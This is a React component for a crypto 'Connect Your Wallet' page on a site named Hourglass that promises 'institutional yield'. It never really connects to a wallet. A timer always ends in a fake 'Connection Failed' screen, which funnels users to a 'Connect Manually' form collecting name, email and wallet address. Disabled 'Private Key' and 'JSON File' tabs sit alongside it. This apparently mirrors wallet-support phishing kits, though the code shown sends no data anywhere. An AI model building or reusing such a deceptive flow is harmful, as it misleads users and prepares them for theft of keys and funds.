import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Wallet, Link as LinkIcon, CreditCard, Shield, Palette, Cpu, Ghost, Circle, ArrowLeft, WifiOff, Loader2, CheckCircle } from "lucide-react";
import { Link } from "wouter";
import { useState } from "react";

interface WalletOption {
  id: string;
  name: string;
  Icon: typeof Wallet;
}

const wallets: WalletOption[] = [
  { id: "metamask", name: "MetaMask", Icon: Wallet },
  { id: "walletconnect", name: "WalletConnect", Icon: LinkIcon },
  { id: "coinbase", name: "Coinbase Wallet", Icon: CreditCard },
  { id: "trust", name: "Trust Wallet", Icon: Shield },
  { id: "rainbow", name: "Rainbow", Icon: Palette },
  { id: "ledger", name: "Ledger", Icon: Cpu },
  { id: "phantom", name: "Phantom", Icon: Ghost },
  { id: "okx", name: "OKX Wallet", Icon: Circle },
];

export default function ConnectWallet() {
  const [isLoading, setIsLoading] = useState(false);
  const [showManualConnect, setShowManualConnect] = useState(false);
  const [showApplicationForm, setShowApplicationForm] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string>("");
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    walletAddress: "",
    message: "",
  });

  const handleWalletSelect = (walletId: string, walletName: string) => {
    setSelectedWallet(walletName);
    setIsLoading(true);
    setShowManualConnect(false);
    setShowApplicationForm(false);

    setTimeout(() => {
      setIsLoading(false);
      setShowManualConnect(true);
    }, 10000);
  };

  const handleSubmitApplication = (e: React.FormEvent) => {
    e.preventDefault();
    setShowSuccess(true);
    setTimeout(() => {
      setShowSuccess(false);
      setShowApplicationForm(false);
      setShowManualConnect(false);
      setSelectedWallet("");
      setFormData({ name: "", email: "", walletAddress: "", message: "" });
    }, 3000);
  };

  return (
    <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
      <header className="border-b border-[#1a2e2a]/50 bg-[#0a1614]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/" className="flex items-center gap-2 text-[#9ca3af] hover:text-[#f5f1e8] transition-colors" data-testid="link-back">
              <ArrowLeft className="w-5 h-5" />
              <span className="text-sm font-medium">Back</span>
            </Link>
            
            <span className="text-lg sm:text-xl font-bold tracking-tight" data-testid="text-logo">Hourglass</span>
            
            <div className="w-20"></div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-20">
        {isLoading ? (
          <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="loading-container">
            <Loader2 className="w-16 h-16 text-[#3dd9b3] animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-2">Connecting to {selectedWallet}</h2>
            <p className="text-[#9ca3af]">Please wait while we establish a connection...</p>
          </div>
        ) : showSuccess ? (
          <div className="flex flex-col items-center justify-center min-h-[400px] text-center" data-testid="success-container">
            <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
              <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
            </div>
            <h2 className="text-3xl font-bold text-[#f5f1e8] mb-4">Application Submitted!</h2>
            <p className="text-lg text-[#9ca3af] max-w-md">
              Our support team will contact you shortly to help with manual wallet connection.
            </p>
          </div>
        ) : showApplicationForm ? (
          <div className="max-w-3xl mx-auto" data-testid="application-form-container">
            <div className="flex gap-2 mb-8">
              <button className="flex items-center gap-2 bg-[#3dd9b3] text-[#0a1614] px-6 py-3 rounded-lg font-semibold" data-testid="tab-application">
                <Shield className="w-4 h-4" />
                Application Form
              </button>
              <button className="flex items-center gap-2 bg-transparent border border-[#3dd9b3]/20 text-[#9ca3af] px-6 py-3 rounded-lg" disabled data-testid="tab-private-key">
                <Shield className="w-4 h-4" />
                Private Key
              </button>
              <button className="flex items-center gap-2 bg-transparent border border-[#3dd9b3]/20 text-[#9ca3af] px-6 py-3 rounded-lg" disabled data-testid="tab-json">
                <CreditCard className="w-4 h-4" />
                JSON File
              </button>
            </div>

            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-6" data-testid="heading-form">
              Submit your connection request
            </h2>

            <div className="bg-[#1a2e2a]/30 border border-[#3dd9b3]/30 rounded-lg p-6 mb-6">
              <div className="flex gap-3 text-[#3dd9b3]">
                <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-semibold mb-2">Your Security is Our Priority</h3>
                  <p className="text-sm text-[#9ca3af]">
                    Your information is processed securely and used only to assist with wallet connection. We use industry-standard encryption protocols to ensure your contact details remain completely private and secure throughout the support process.
                  </p>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmitApplication} className="space-y-6">
              <Textarea
                id="application-details"
                required
                value={formData.message}
                onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                className="bg-[#0f2520] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#5f7872] min-h-[180px] text-sm"
                placeholder="Name: Your Full Name&#10;Email: your.email@example.com&#10;Wallet Address (optional): 0x...&#10;Issue Description: Describe what happened when trying to connect..."
                data-testid="textarea-application"
              />

              <div className="space-y-2 text-sm text-[#9ca3af]">
                <p>• Include your full name and email address so we can contact you</p>
                <p>• Wallet address is optional but helps us assist you faster</p>
                <p>• Describe the connection issue you experienced in detail</p>
              </div>

              <div className="flex gap-4 pt-4">
                <Button
                  type="button"
                  onClick={() => {
                    setShowApplicationForm(false);
                    setShowManualConnect(true);
                  }}
                  size="lg"
                  variant="outline"
                  className="flex-1 border-[#3dd9b3]/40 text-[#9ca3af]"
                  data-testid="button-cancel"
                >
                  Cancel
                </Button>
                <Button
                  type="submit"
                  size="lg"
                  className="flex-1 bg-[#3dd9b3] text-[#0a1614] font-semibold"
                  data-testid="button-submit-application"
                >
                  Submit Request
                </Button>
              </div>
            </form>
          </div>
        ) : showManualConnect ? (
          <div className="flex flex-col items-center justify-center min-h-[400px] text-center" data-testid="manual-connect-container">
            <div className="mb-6 p-6 rounded-full bg-[#1a2e2a]/30">
              <WifiOff className="w-20 h-20 text-[#3dd9b3]" />
            </div>
            <h2 className="text-3xl font-bold text-[#f5f1e8] mb-4">Connection Failed</h2>
            <p className="text-lg text-[#9ca3af] mb-8 max-w-md">
              Unable to connect to {selectedWallet} automatically. Please check your wallet extension and try again.
            </p>
            <Button 
              onClick={() => {
                setShowManualConnect(false);
                setShowApplicationForm(true);
              }}
              size="lg"
              className="bg-[#3dd9b3] text-[#0a1614] font-semibold"
              data-testid="button-connect-manually"
            >
              Connect Manually
            </Button>
          </div>
        ) : (
          <>
            <div className="text-center mb-12">
              <h1 className="text-4xl sm:text-5xl font-bold text-[#f5f1e8] mb-4" data-testid="heading-connect-wallet">
                Connect Your Wallet
              </h1>
              <p className="text-lg text-[#9ca3af]" data-testid="text-description">
                Choose your preferred wallet to access institutional yield
              </p>
            </div>

            <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
              {wallets.map((wallet) => {
                const IconComponent = wallet.Icon;
                return (
                  <button
                    key={wallet.id}
                    onClick={() => handleWalletSelect(wallet.id, wallet.name)}
                    className="bg-[#1a2e2a]/30 border border-[#3dd9b3]/20 rounded-lg p-6 flex flex-col items-center justify-center gap-4 hover:bg-[#1a2e2a]/50 hover:border-[#3dd9b3]/40 transition-all"
                    data-testid={`button-wallet-${wallet.id}`}
                  >
                    <IconComponent className="w-12 h-12 text-[#3dd9b3]" />
                    <span className="text-base font-medium text-[#f5f1e8]">{wallet.name}</span>
                  </button>
                );
              })}
            </div>

            <div className="mt-12 text-center">
              <p className="text-sm text-[#9ca3af]">
                By connecting a wallet, you agree to our{" "}
                <a href="#terms" className="text-[#3dd9b3] hover:underline" data-testid="link-terms">
                  Terms of Service
                </a>
              </p>
            </div>
          </>
        )}
      </main>
    </div>
  );
}
